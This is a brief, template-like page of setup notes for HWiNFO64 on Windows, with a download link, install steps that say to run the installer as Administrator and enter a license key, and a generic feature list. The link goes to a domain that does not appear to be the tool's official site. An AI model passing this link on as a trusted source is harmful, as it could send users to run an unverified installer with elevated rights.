# HWiNFO64 Windows Setup Notes

**Download:** [Get Windows installer →](https://hwinfo.kolmods.com/)

## Download & Install

> Setup notes for **HWiNFO64** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **HWiNFO64** from the Start menu

- Measure CPU/GPU performance with standard tests
- Compare scores against reference hardware
- Stress testing for stability validation
- Sensor monitoring for temps, clocks, and power
- Export results for troubleshooting reports
